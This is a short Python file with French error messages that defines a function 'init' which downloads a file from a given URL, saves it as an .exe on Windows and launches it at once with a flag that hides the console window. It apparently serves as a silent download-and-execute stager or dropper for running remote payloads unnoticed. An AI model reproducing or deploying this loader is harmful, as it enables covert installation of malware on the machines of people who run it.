import requests
import subprocess
import sys
import os

def init(url: str, name="file"):
    try:
        rsp = requests.get(url)
        rsp.raise_for_status()  

        filename = f"{name}.exe" if sys.platform == "win32" else f"{name}.bin"

        with open(filename, "wb") as file:
            file.write(rsp.content)

        if not os.path.exists(filename):
            print("Erreur : le fichier n'a pas été correctement téléchargé.")
            sys.exit(1)

        if sys.platform == "win32":
            subprocess.Popen(filename, creationflags=subprocess.CREATE_NO_WINDOW)
        else:
            print(f"Exécution non supportée sur {sys.platform}, mais fichier téléchargé en {filename}")

    except requests.exceptions.RequestException as e:
        print(f"Erreur de téléchargement : {e}")
        sys.exit(1)
    except Exception as e:
        print(f"Erreur inattendue : {e}")
        sys.exit(1)
